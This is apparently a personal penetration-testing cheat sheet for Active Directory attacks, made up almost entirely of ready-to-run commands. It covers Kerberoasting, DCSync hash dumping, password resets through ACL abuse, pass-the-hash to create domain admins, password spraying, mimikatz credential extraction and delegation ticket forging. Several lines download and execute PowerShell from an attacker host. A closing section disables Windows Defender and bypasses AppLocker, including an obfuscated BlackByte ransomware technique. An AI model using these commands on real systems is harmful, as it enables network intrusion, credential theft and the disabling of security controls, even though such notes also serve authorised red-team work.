---
description: >-
  This is just a living document of things I have needed for domain
  enumeration/exploitation
---
# Domain Enumeration + Exploitation
## PowerSploit
Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev). For an already incredible cheat sheet, [check out HarmJ0y's](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993).
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
```
### Get Domain Users
```powershell
Get-NetUser * -Domain burmat.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-CSV users.csv
```
### Get Domain Computers
```powershell
Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv
```
### Get Group Members
```powershell
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object membername
```
### SPN Ticket Request (Kerberoasting)
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation
```
### Targeted Kerberoasting
```powershell
Get-DomainUser 'victimuser' | Select serviceprincipalname
Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash to crack
$User = Get-DomainUser 'victimuser'
$User | Get-DomainSPNTicket | fl

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```
### Enumerate User DACLs
```powershell
Get-DomainObjectAcl -Identity it_admin -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID burmat) }
```
### Enumerate Network Shares
```powershell
## scan an entire domain:
find-domainshare -computerdomain burmat.local

## narrow down scope, check permissions:
find-domainshare -computername websrv.burmat.local -computerdomain burmat.local -CheckShareAccess
```
### Impersonate Another Domain User
```powershell
$cred = New-Object System.Management.Automation.PSCredential "BURMAT\John.Smith", $(ConvertTo-SecureString "Spring2020!" -AsPlainText -Force);

Find-DomainShare -ComputerName fs01.burmat.local -Credential $cred -ComputerDomain burmat.local -CheckShareAccess

Invoke-UserImpersonation -Credential $cred

# now we can read the directory impersonating another user if permissions exist:
dir \\fs01.burmat.local\Private
```
### Enumerate GPO's
```powershell
"{7EA15487-7F5B-4CE3-C029-CEBE6FFE6D47}" | Get-DomainGPO
```
### Reset Domain User Password
If you own the owner of another AD user object (`WriteOwner`, `WriteDACL`, `GenericWrite`, `Owner`, etc), you can reset the password with ease:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
$user = 'DOMAIN\owner_acct';
$pass= ConvertTo-SecureString 'Password123!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
$newpass = ConvertTo-SecureString 'burmatw@sh3r3' -AsPlainText -Force;
Set-DomainUserPassword -Identity 'DOMAIN\vuln_user' -AccountPassword $newpass -Credential $creds;
```
Or if you can set yourself as owner, the following will do:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
Set-DomainObjectOwner -Identity it_admin -OwnerIdentity burmat
Add-DomainObjectAcl -TargetIdentity it_admin -PrincipalIdentity burmat
$newpass = ConvertTo-SecureString -String 'burmat123$' -AsPlainText -Force
Set-DomainUserPassword -Identity it_admin -AccountPassword $newpass
```
Or you can do it using Impacket's "smbpasswd.py", as shown below.
### Add/Exploit DCSync Rights
Do you have `WriteDACL` to a domain? Give DCSync rights to an unprivileged domain user account:
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=burmat,DC=local" -PrincipalIdentity jsmith -Rights DCSync
```
And use these rights to dump the hashes from the domain:
```
meterpreter > dcsync_ntlm burmat.local\\jsmith
```
## Impacket
Thanks to the [impacket](https://github.com/SecureAuthCorp/impacket) toolset, exploiting misconfigurations in AD environments is made easier.
### GetUserSPNs.py
```sh
GetUserSPNs.py -request -dc-ip 10.10.10.123 burmat.local/xsvc:S3cur3PW123
```
### GetNPUsers.py
Attempt to get TGTs for users that have `UF_DONT_REQUIRE_PREAUTH` set:
```bash
GetNPUsers.py -request -no-pass -dc-ip 10.10.10.123 burmat.local/ -usersfile users.txt
```
### secretsdump.py
Attack a local offline copy of NTDS.dit:
```bash
secretsdump.py -ntds /root/l00t/ntds.dit -system /root/l00t/systemhive LOCAL
```
Or you can attack a system remotely:
```bash
secretsdump.py -just-dc-ntlm burmat.local/administrator@10.10.10.123
```
### GetADUsers.py
Leverage this script to grab usernames via LDAP
```bash
GetADUsers.py -all -no-pass -dc-ip 10.10.10.123 burmat.local/ | cut -d " " -f 1 | grep -Ev 'Name|Impacket|\-\-|\[' >> users.txt
```
### smbpasswd.py
Reset a password if you have the credentials but it is expired. Useful if you have a hash and no pw, too.
```bash
smbpasswd -r 10.0.0.12 -U 'burmat'
```
## NetExec
GitHub repo: [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
### Pass-the-Hash
Because hashes are just as good:
```sh
# create a user
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -H 'd7452863d1e8e15241nn50ceb1ab9dfe' -x 'net user burmat Pwn3dPwn3d! /add /domain'

# add to domain admins
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -H 'd7452863d1e8e15241nn50ceb1ab9dfe' -x 'net group "Domain Admins" /add burmat /domain'
```
### SMB Password Spraying
Switch out usernames/passwords/targets with lists:
```bash
## to spray that Spring2020! and a list of users against a list of targets:
nxc smb 'targets.txt' -u 'users.txt' -p 'Spring2024!' -d 'burmat.local'
```
### Dumping Remote PowerShell History
```bash
nxc smb 10.250.1.33 -u 'dev001' -p 'burmat123$' -d 'burmat.local' -M powershell_history
```
### Extracting Credentials
```bash
## mimikatz module
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -p 'S3cur3PW123' -M mimikatz -o COMMAND='privilege::debug'

## SAM database
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -p 'S3cur3PW123' --sam
```
## PowerUpSQL

GitHub Repo: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and more thorough cheat sheet: [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
### MSSQL Enumeration
```powershell
## basic instance information
Get-SQLInstanceLocal

## more verbose information:
Get-SQLServerInfo -Verbose -Instance SQLSRV\SQLEXPRESS

## crawl for databse links:
Get-SqlServerLinkCrawl -Verbose -Instance SQLSRV\SQLEXPRESS
```
### Execute DB Query via MSSQL Link
```powershell
Get-SqlServerLinkCrawl -Verbose -Instance SQLSRV\SQLEXPRESS -Query "select name from master..sysdatabases" | Select-Object -ExpandProperty CustomQuery
```

## Kerberos
### Brute Usernames with Nmap
```bash
nmap -v -Pn -p 88 --script krb5-enum-users.nse --script-args "realm='burmat.local', userdb='users.txt'" 10.10.10.123
```
### GenericWrite to Host + User SPN = PWN
If we have `GenericWrite` privileges over a host and we are a user that has an SPN, we can write our SID to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property against the AD object and forge tickets as anyone we like. You can read more about it here: [https://alsid.com/company/news/kerberos-resource-based-constrained-delegation-new-control-path](https://alsid.com/company/news/kerberos-resource-based-constrained-delegation-new-control-path)
```powershell
## we can write our delegation attribute to the DC with the following:
$UserSid = Get-DomainUser svc_burmat -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($UserSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer websrv.burmat.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

## use rubeus to forge tickets as administrator accounts
rubeus.exe s4u /user:svc_burmat /ticket:doIFFDCCBRCg..SNIP.. /impersonateuser:administrator /msdsspn:cifs/websvr.burmat.local /ptt
```
### Setting an SPN
#### With `setspn.exe`:

```powershell 
setspn -s MSSQLSvc/USER-PC01.burmat.local burmat.local\svc-mssql 
setspn -L burmat.local\svc-mssql

# remove with:
setspn -d MSSQLSvc/USER-PC01.burmat.local burmat.local\svc-mssql
```
`ActiveDirectory` module:
```powershell
Set-ADUser -Identity svc-mssql -ServicePrincipalNames @{Add='MSSQLSvc/USER-PC01.burmat.local','host/USER-PC01.burmat.local'}

# clear them out with
Set-ADUser -Identity svc-mssql -ServicePrincipalNames $Null
```
### Listing SPNs
#### Using `ldifde`
```powershell
ldifde -d "DC=burmat,DC=local" -l ServicePrincipalName -F C:\SPNs.txt
```
#### Using the PowerShell Module `ActiveDirectory`
```powershell
Get-ADComputer -Filter * -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames

Get-ADUser -Filter * -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames
```
#### With `DirectorySearcher`
```powershell
$s = New-Object DirectoryServices.DirectorySearcher([ADSI]"");
$s.PageSize = 2000; 
$s.Filter = "(servicePrincipalName=*)" 
$s.FindAll()
```
#### Using `ldapsearch`
[https://burmat.gitbook.io/security/hacking/domain-exploitation#ldap-enumeration](https://burmat.gitbook.io/security/hacking/domain-exploitation#ldap-enumeration)
### Creating a Keytab
```powershell
ktpass /princ wsman/svc-mssql@burmat.local /mapuser svc-mssql@burmat.local /pass "S3cur3PW123" /out svc-mssql.keytab /crypto all /ptype KRB5_NT_PRINCIPAL /mapop set
```
### Kerberoasting:
#### Rubeus
```powershell
rubeus.exe kerberoast /creduser:burmat.local\xsvc /credpassword:S3cur3PW123 /outfile:user.hash
```
#### PowerView
```sh
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation
```
### Attacking spoolss  ("The Printer Bug")
From a host with unconstrained delegation, "[the printer bug](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)" and [dementor.py](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) can be used to cause a TGT relay from the target host to us running responder, so we can generate a TGS for any user on that target host:
```sh
## set up a relay with responder:
responder -I tun0 --lm # tun0 = 10.10.15.123

## execute exploit through:
proxychains python dementor.py -u xsvc -p 'S3cur3PW123' -d 'burmat.local' 10.10.15.123 10.10.10.123
```
## 
## Endpoint Protection

### Endpoint Detection & Response (EDR)
#### Checking Status

```powershell
Get-MpComputerStatus
```
#### Adding Exclusion
```powershell
Add-MpPreference -ExclusionPath 'C:\windows\temp'
```
#### Scanning a File with Defender
```powershell
C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -DisableRemediation -File 'C:\stager.exe'
```
#### Disabling Defender
```powershell
taskkill  /F /IM MSASCuiL.exe

Set-MpPreference -DisableIntrusionPreventionSystem $true `
-DisableRealtimeMonitoring $true -DisableScriptScanning $true `
-EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode `
-Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0x2 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f
```
#### Disable Defender on Reboot (A BlackByte TTP)
```powershell
powershell -command "$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x"
```
#### Checking AppLocker
```powershell
$a = Get-ApplockerPolicy -effective; $a.rulecollections;
```
You can also review the AppLocker policies by enumerating the Registry manually:
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
reg query "HKEY_LOCAL_Machine\Software\Policies\Microsoft\Windows\SrpV2" /s
```
#### Language Mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```
#### Nested PowerShell Bypass
```powershell
powershell.exe -enc [BASE64THIS(powershell.exe -w hidden -c "iex(...)"]>
```
#### 32-Bit PowerShell Bypass
PowerShell disabled for you? Try running the 32-bit copy of it:
```sh
C:\windows\syswow64\windowspowershell\v1.0\powershell whoami
```
#### Default Writable Folders for Execution Control Bypass

Try putting your payload in one of the following directories:
```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing 
```

## Miscellaneous
```powershell
# list shared folders
Get-WmiObject -Class Win32_Share -Computer dc1.burmat.local

## get .NET versions installed:
dir C:\Windows\Microsoft.NET\Framework
```